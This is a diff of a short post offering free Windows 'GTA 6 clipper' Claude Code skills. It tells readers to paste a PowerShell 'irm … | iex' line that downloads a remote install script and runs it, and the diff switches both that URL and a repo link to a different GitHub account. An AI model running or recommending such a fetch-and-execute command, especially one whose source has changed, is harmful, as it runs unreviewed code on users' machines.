@@ -2,12 +2,12 @@
 
 **Title:** GTA 6 Clipper for WINDOWS: free Claude Code skills (finished + live)
 
-Here are both GTA 6 clipper skills from the video. This is the Windows version (Windows 10/11). Mac version: https://github.com/vossashtonai/gta6-clipper
+Here are both GTA 6 clipper skills from the video. This is the Windows version (Windows 10/11). Mac version: https://github.com/serveai-dev/gta6-clipper
 
 **1. Open PowerShell** (click Start, type PowerShell, open it), paste this and press Enter:
 
 ```powershell
-irm https://raw.githubusercontent.com/vossashtonai/gta6-clipper-windows/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/serveai-dev/gta6-clipper-windows/main/install.ps1 | iex
 ```
 
 Wait until it says READY (first time 5 to 10 minutes). PowerShell is already on every Windows PC.
